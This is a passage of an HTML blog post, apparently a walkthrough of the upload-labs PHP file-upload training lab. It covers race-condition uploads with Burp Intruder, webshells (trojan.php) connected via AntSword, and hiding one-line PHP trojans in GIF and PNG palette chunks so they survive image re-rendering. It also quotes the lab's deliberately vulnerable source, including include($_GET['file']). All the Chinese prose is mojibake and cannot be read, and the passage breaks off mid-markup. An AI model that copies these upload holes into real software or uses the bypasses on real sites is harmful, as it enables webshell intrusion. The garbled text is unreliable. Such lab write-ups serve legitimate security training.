</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">)[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;asp&#34;</span><span class="p">,</span><span class="s2">&#34;aspx&#34;</span><span class="p">,</span><span class="s2">&#34;php&#34;</span><span class="p">,</span><span class="s2">&#34;jsp&#34;</span><span class="p">,</span><span class="s2">&#34;htaccess&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$blacklist</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h3 id="Êù°‰ª∂Á´û‰∫â">Êù°‰ª∂Á´û‰∫â</h3>
<p>ÂÖ∂ÂÆûÊ†πÊçÆÊèêÈÜíÊàë‰ª¨Â∑≤ÁªèÂèØ‰ª•Êúâ‰∏Ä‰∏™ÊòéÁ°ÆÁöÑÊÄùË∑Ø‰∫ÜÔºåÂ∞±ÊòØÊàë‰ª¨Âà©Áî®Á≥ªÁªü‰∏ÄÊ¨°Âè™ËÉΩÂ§ÑÁêÜ‰∏Ä‰ª∂‰∫ãÊÉÖÁöÑÁâπÊÄßÔºåÈÄöËøáÂêåÊó∂ÂèëËµ∑‰∏ä‰º†‰ª•ÂèäËÆøÈóÆÁöÑËØ∑Ê±ÇÔºåÂØºËá¥ÊúçÂä°Âô®ËøòÊù•‰∏çÂèäÂ§ÑÁêÜÂà†Èô§Âç¥ÂÖàÊâßË°åËÆøÈóÆÔºåÂØºËá¥webshellÁöÑÂÜôÂÖ• <!-- raw HTML omitted --></p>
<p>Êàë‰ª¨Âú®ÁªìÂêàÊ∫êÁ†ÅÊù•ÁúãÔºåËøôÈáåÈááÁî®‰∫ÜÁôΩÂêçÂçïÁöÑÊâãÊÆµÈÅøÂÖç‰∫Ü‰ªª‰ΩïÁöÑÁªïËøáÔºåÊâÄ‰ª•Êàë‰ª¨Êù•Âà©Áî®Êù°‰ª∂Á´û‰∫âÊù•Â∞ùËØïÁªïËøá <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">)[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$upload_file</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;gif&#39;</span><span class="p">,</span><span class="s1">&#39;jpeg&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span><span class="nv">$whitelist</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$rename_file</span> <span class="o">=</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="o">.</span> <span class="nv">$rename_file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">rename</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Êàë‰ª¨ÈÄöËøáBurpÁöÑIntruderËøõË°åÊó†ÈôêÂà∂ÁöÑËØ∑Ê±ÇÔºå‰∏ÄËæπ‰∏ä‰º†Êñá‰ª∂ÔºåËøôÂ∞ÜËß¶ÂèëÊúçÂä°Âô®ËøõË°åÂÆ°Ê†∏‰ª•ÂèäÂà†Èô§Ôºå‰∏ÄËæπËÆøÈóÆ <code>shell.php</code> Êù•Ë∞ÉÁî®ÔºåÊúÄÁªàÊúçÂä°Âô®‰ºöÂõ†‰∏∫Êù•‰∏çÂèäÂà†Èô§ËÄåÂØºËá¥webshellË¢´ÊàêÂäüË∞ÉÁî®Ôºå <code>trojan.php</code> Ë¢´ÂÜôÂÖ•„ÄÇ <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-04-30_16-12-33_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-04-30_16-12-20_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p><!-- raw HTML omitted --> <!-- raw HTML omitted -->
ÊúÄÁªàÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ <code>trojan.php</code> Ë¢´ÊàêÂäüÂÜôÂÖ•ÔºåÂêåÊó∂Áî®ËöÅÂâëÊµãËØïËøûÊé•ÊàêÂäü <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-04-30_16-13-56_screenshot.png" width="300px"/>
</figure>
 <!-- raw HTML omitted --></p>
<h3 id="‰∫åÊ¨°Ê∏≤Êüì">‰∫åÊ¨°Ê∏≤Êüì</h3>
<p>Ê†πÊçÆÊèêÁ§∫‰ø°ÊÅØÔºåÊàë‰ª¨Áü•ÈÅìÊàë‰ª¨ÊâÄ‰∏ä‰º†ÁöÑÂõæÁâáÈ©¨‰ºöË¢´‰∫åÊ¨°Ê∏≤ÊüìÔºåÂØºËá¥Â§±ÊïàÔºåÂõ†Ê≠§Êàë‰ª¨ÂàÜ‰∏çÂêåÁöÑÂõæÁâáÊ†ºÂºèÊù•ÁªïËøá <!-- raw HTML omitted -->
ÂêåÊó∂Êàë‰ª¨ÁÇπÂáªÊü•ÁúãÊèêÁ§∫ÁöÑÊåâÈíÆÔºåÂèØ‰ª•ÂèëÁé∞urlÂèëÁîü‰∫ÜÂèòÂåñÔºåÁªìÂêàÊ∫êÁ†ÅÔºåÊàë‰ª¨ÂèëÁé∞ËøôÈáåÂèØ‰ª•Áî®Êù•Ëß£ÊûêÊàë‰ª¨‰∏ä‰º†ÊàêÂäüÁªïËøáÊ∏≤ÊüìÁöÑÂõæÁâáÈ©¨ÔºåÂΩ¢ÊàêÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;button&#34;</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;btn btn-success&#34;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&#34;window.location.href=(&#39;?file=hint.html&#39;)&#34;</span><span class="o">&gt;</span><span class="nx">ÁÇπÂáªÊü•Áúã</span> <span class="nx">‚ÄúÊèêÁ§∫‚Äù</span><span class="o">&lt;/</span><span class="nx">button</span><span class="o">&gt;&lt;/</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">p</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;lead&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ÁõÆÂâçÂæàÂ§öÁΩëÁ´ôÈÉΩ‰ºöÂØπÁî®Êà∑‰∏ä‰º†ÁöÑÂõæÁâáÂÜçÊ¨°ÂéãÁº©„ÄÅË£ÅÂâ™Á≠âÊ∏≤ÊüìÊìç‰ΩúÔºåÊâÄ‰ª•ÊôÆÈÄöÁöÑÂõæÁâáÈ©¨ÈÉΩÈöæÈÄÉË¢´Ê∏≤ÊüìÁöÑÊÇ≤ÂâßÔºåÈÇ£‰πàÊúâÊ≤°ÊúâÈÇ£ÁßçÂèØ‰ª•ÁªïËøáÊ∏≤ÊüìÁöÑÂõæÁâáÂë¢Ôºü</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-success&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;window.location.href=(&#39;?file=hint.html&#39;)&#34;</span><span class="p">&gt;</span>ÁÇπÂáªÊü•Áúã ‚ÄúÊèêÁ§∫‚Äù<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span></code></pre></div><h4 id="gif">GIF</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;gif&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/gif&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmpname</span><span class="p">,</span> <span class="nv">$upload_file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">         <span class="c1">//‰ΩøÁî®‰∏ä‰º†ÁöÑÂõæÁâáÁîüÊàêÊñ∞ÁöÑÂõæÁâá
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$im</span> <span class="o">=</span> <span class="nx">imagecreatefromgif</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$im</span> <span class="o">==</span> <span class="k">false</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//ÁªôÊñ∞ÂõæÁâáÊåáÂÆöÊñá‰ª∂Âêç
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">srand</span><span class="p">(</span><span class="nx">time</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$newfilename</span> <span class="o">=</span> <span class="nx">strval</span><span class="p">(</span><span class="nx">rand</span><span class="p">())</span><span class="o">.</span><span class="s2">&#34;.gif&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">//ÊòæÁ§∫‰∫åÊ¨°Ê∏≤ÊüìÂêéÁöÑÂõæÁâáÔºà‰ΩøÁî®Áî®Êà∑‰∏ä‰º†ÂõæÁâáÁîüÊàêÁöÑÊñ∞ÂõæÁâáÔºâ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$newfilename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">imagegif</span><span class="p">(</span><span class="nv">$im</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Êàë‰ª¨Áî® <code>Hex Friend</code> ÂØπÊØî‰∏Ä‰∏ãÂéügifÂíå‰∏ä‰º†Âêé‰∫åÊ¨°Ê∏≤ÊüìÁöÑgif <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/gif.gif" width="100px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/gif_edited.gif" width="100px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p><!-- raw HTML omitted --> <!-- raw HTML omitted -->
ÁÑ∂ÂêéÂ∞Ü‰∏ÄÂè•ËØùÊú®È©¨ÊèíÂÖ•Âà∞Ê≤°ÊúâË¢´‰øÆÊîπÁöÑ‰ΩçÁΩÆÂç≥ÂèØ <!-- raw HTML omitted -->
ÂèØ‰ª•ÁúãÂà∞ÁªèËøá‰∫åÊ¨°Ê∏≤ÊüìÁöÑÂõæÁâá‰ªçÁÑ∂Âê´Êúâ‰∏ÄÂè•ËØùÊú®È©¨ <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-04-30_17-06-36_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>ÂÜçÂà©Áî®ÂèëÁé∞ÁöÑÊºèÊ¥ûÔºåËß£Êûê‰∏ä‰º†ÊàêÂäüÁöÑÂõæÁâáÈ©¨ÔºåËöÅÂâëÊµãËØïËøûÊé•ÊàêÂäü <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-04-30_17-17-20_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<h4 id="png">PNG</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="nv">$fileext</span> <span class="o">==</span> <span class="s2">&#34;png&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$filetype</span><span class="o">==</span><span class="s2">&#34;image/png&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmpname</span><span class="p">,</span> <span class="nv">$upload_file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">         <span class="c1">//‰Ωø
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$im</span> <span class="o">=</span> <span class="nx">imagecreatefrompng</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$im</span> <span class="o">==</span> <span class="k">false</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//ÁªôÊñ∞ÂõæÁâáÊåáÂÆöÊñá‰ª∂Âêç
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">srand</span><span class="p">(</span><span class="nx">time</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$newfilename</span> <span class="o">=</span> <span class="nx">strval</span><span class="p">(</span><span class="nx">rand</span><span class="p">())</span><span class="o">.</span><span class="s2">&#34;.png&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">//ÊòæÁ§∫‰∫åÊ¨°Ê∏≤ÊüìÂêéÁöÑÂõæÁâáÔºà‰ΩøÁî®Áî®Êà∑‰∏ä‰º†ÂõæÁâáÁîüÊàêÁöÑÊñ∞ÂõæÁâáÔºâ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$newfilename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$im</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><!-- raw HTML omitted -->
<ul>
<li>
<p>ÂâçÁΩÆÁü•ËØÜ</p>
<p>Âú®‰ªãÁªç‰∏§ÁßçÂÜôÂÖ•php‰∏ÄÂè•ËØùÊú®È©¨Âà∞PNGÂõæÁâáÁöÑÊñπÊ≥ï‰πãÂâçÔºåÊàë‰ª¨ÂÖàÊù•‰∫ÜËß£‰∏Ä‰∏ãPNGÂõæÁâáÁöÑÁªÑÊàêÔºåÂèÇËÄÉjanesÂ∏àÂÇÖÁöÑÊñáÁ´†Ôºö<a class="link" href="http://drops.xmd5.com/static/drops/tips-16034.html"  target="_blank" rel="noopener"
    >php imagecreatefrom* Á≥ªÂàóÂáΩÊï∞‰πã png</a> <!-- raw HTML omitted --></p>
<p>PNG ÂõæÁâáÊúâ‰∏âÁßçÂõæÂÉèÊ®°ÂºèÔºöÁ¥¢ÂºïÂΩ©Ëâ≤ÂõæÂÉè(index-color images)ÔºåÁÅ∞Â∫¶ÂõæÂÉè(grayscale images)ÔºåÁúüÂΩ©Ëâ≤ÂõæÂÉè(true-color images), ÂÖ∂‰∏≠Á¥¢ÂºïÂΩ©Ëâ≤ÂõæÂÉè‰πüÁß∞‰∏∫Âü∫‰∫éË∞ÉËâ≤ÊùøÂõæÂÉè(Palette-based images)„ÄÇ‰∏çÂêåÁöÑÂõæÁâáÊ®°Âºè‰∏ªË¶ÅÊòØÂåÖÂê´ÁöÑ‰ø°ÊÅØÔºåÂ±ïÁé∞ÁöÑÂõæÂÉè‰∏ç‰∏ÄÊ†∑ÔºàËâ≤ÂΩ©ÔºüÔºâ <!-- raw HTML omitted --></p>
<p>‰∏Ä‰∏™PNGÊñá‰ª∂Ê≤π‰∏Ä‰∏™ <code>png signature</code> ‰ª•ÂèäÂ§ö‰∏™ <code>png chunk</code> ÁªÑÊàê <!-- raw HTML omitted --></p>
<p>PNG signature: png Ê†áËØÜ
: Êàë‰ª¨‰πãÂâçÊèêÂà∞ËøáÁöÑÔºåÁî®Êù•ÊåáÁ§∫Êñá‰ª∂Ê†ºÂºèÁöÑÂ§¥ÈÉ®Ôºå8bites <!-- raw HTML omitted -->
89 50 4E 47 OD 0A 1A 0A <!-- raw HTML omitted --></p>
<p>PNG chunk: png Êï∞ÊçÆÂùó
: PNG chunkÂèàÂàÜ‰∏∫‰∏§Áßç <!-- raw HTML omitted -->
-   ÂÖ≥ÈîÆÊï∞ÊçÆÂùó(critical chunk)ÔºåÊ†áÂáÜÊï∞ÊçÆÂùóÔºö <code>IHDR, IDAT, IEND</code> <!-- raw HTML omitted -->
-   ËæÖÂä©Êï∞ÊçÆÂùó(ancillary chunks), ÂèØÈÄâÊï∞ÊçÆÂ∫ìÔºö <code>PLTE</code> <!-- raw HTML omitted --></p>
<p>PNG Êï∞ÊçÆÂùóÁªìÊûÑ
: pngÊï∞ÊçÆÂùóÁî±Âõõ‰∏™ÈÉ®ÂàÜÁªÑÊàêÔºö <!-- raw HTML omitted -->
1.  length: 4 bytes <!-- raw HTML omitted -->
2.  type: 4 bytes <!-- raw HTML omitted -->
3.  data <!-- raw HTML omitted -->
4.  CRC: 4bytes <!-- raw HTML omitted --></p>
<p>Êé•‰∏ãÊù•Êàë‰ª¨ÂÜçÁÆÄÂçï‰ªãÁªç‰∏Ä‰∫õ‰∏äÈù¢ÊèêÂà∞ÁöÑÊ†áÂáÜÊï∞ÊçÆÂùóÁöÑ‰ΩúÁî®ÔºåËØ¶ÁªÜÁöÑ‰ø°ÊÅØÂèØ‰ª•ÂèÇËÄÉÊñáÁ´†ÊàñËÄÖÂèÇËÄÉÊõ¥Âä†‰∏ì‰∏öÁöÑÊñáÊ°£ <!-- raw HTML omitted --></p>
<p>IHDR
: Êñá‰ª∂Â§¥Êï∞ÊçÆÂùóIHDR(header chunk)ÔºöÂÆÉÂåÖÂê´ÊúâPNGÊñá‰ª∂‰∏≠Â≠òÂÇ®ÁöÑÂõæÂÉèÊï∞ÊçÆÁöÑÂü∫Êú¨‰ø°ÊÅØÔºåÂπ∂Ë¶Å‰Ωú‰∏∫Á¨¨‰∏Ä‰∏™Êï∞ÊçÆÂùóÂá∫Áé∞Âú®PNGÊï∞ÊçÆÊµÅ‰∏≠ÔºåËÄå‰∏î‰∏Ä‰∏™PNGÊï∞ÊçÆÊµÅ‰∏≠ <!-- raw HTML omitted -->Âè™ËÉΩÊúâ‰∏Ä‰∏™Êñá‰ª∂Â§¥Êï∞ÊçÆÂùó<!-- raw HTML omitted --> „ÄÇ <!-- raw HTML omitted --></p>
<p>PLTE
: Ë∞ÉËâ≤ÊùøÊï∞ÊçÆÂùóPLTE(palette chunk)ÂåÖÂê´Êúâ‰∏éÁ¥¢ÂºïÂΩ©Ëâ≤ÂõæÂÉè(indexed-color image)Áõ∏ÂÖ≥ÁöÑÂΩ©Ëâ≤ÂèòÊç¢Êï∞ÊçÆÔºåÂÆÉ‰ªÖ‰∏éÁ¥¢ÂºïÂΩ©Ëâ≤ÂõæÂÉèÊúâÂÖ≥ÔºåËÄå‰∏îË¶ÅÊîæÂú®ÂõæÂÉèÊï∞ÊçÆÂùó(image data chunk)‰πãÂâç„ÄÇ <!-- raw HTML omitted --></p>
<p>IDAT
: ÂõæÂÉèÊï∞ÊçÆÂùóIDAT(image data chunk)ÔºöÂÆÉÂ≠òÂÇ®ÂÆûÈôÖÁöÑÊï∞ÊçÆÔºåÂú®Êï∞ÊçÆÊµÅ‰∏≠ÂèØÂåÖÂê´Â§ö‰∏™ËøûÁª≠È°∫Â∫èÁöÑÂõæÂÉèÊï∞ÊçÆÂùó„ÄÇIDATÂ≠òÊîæÁùÄÂõæÂÉè <!-- raw HTML omitted -->ÁúüÊ≠£ÁöÑÊï∞ÊçÆ‰ø°ÊÅØ<!-- raw HTML omitted --> <!-- raw HTML omitted --></p>
<p>IEND
: ÂõæÂÉèÁªìÊùüÊï∞ÊçÆIEND(image trailer chunk)ÔºöÂÆÉÁî®Êù•Ê†áËÆ∞PNGÊñá‰ª∂ÊàñËÄÖÊï∞ÊçÆÊµÅÂ∑≤ÁªèÁªìÊùüÔºåÂπ∂‰∏îÂøÖÈ°ªË¶ÅÊîæÂú®Êñá‰ª∂ÁöÑÂ∞æÈÉ®„ÄÇ <!-- raw HTML omitted --></p>
<p>Ê†πÊçÆÊñáÁ´†ÁöÑÂÆûÈ™åÔºåÂè™ËÉΩÂêëÁ¥¢ÂºïÂΩ©Ëâ≤ÂõæÂÉè(index-color images)ÁöÑPLTEÊï∞ÊçÆÂùóÊèíÂÖ•php‰ª£Á†ÅÔºåÂÖ∂‰ªñÈÉΩ‰ºöË¢´ <code>imagecreatefrompng</code> Ê∏≤ÊüìÂ§±Êïà <!-- raw HTML omitted --></p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>ÂÜôÂÖ• <code>PLTE</code> Êï∞ÊçÆÂùó</p>
<p><figure><img src="/ox-hugo/png_trojan.png" width="100px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-05-01_21-53-41_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>Êàë‰ª¨ÂèØ‰ª•ÂÖàÂà©Áî®imagemagickÂ∞ÜÂõæÁâáËΩ¨Êç¢‰∏∫Á¥¢ÂºïÂõæÂÉè/Âü∫‰∫éË∞ÉËâ≤ÊùøÂõæÂÉèÔºàPalette-based imagesÔºâ <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">convert png.png -type Palette png_trojan.png
</span></span></code></pre></div><p>‰πãÂêé‰ΩøÁî®<a class="link" href="https://github.com/hxer/imagecreatefrom-"  target="_blank" rel="noopener"
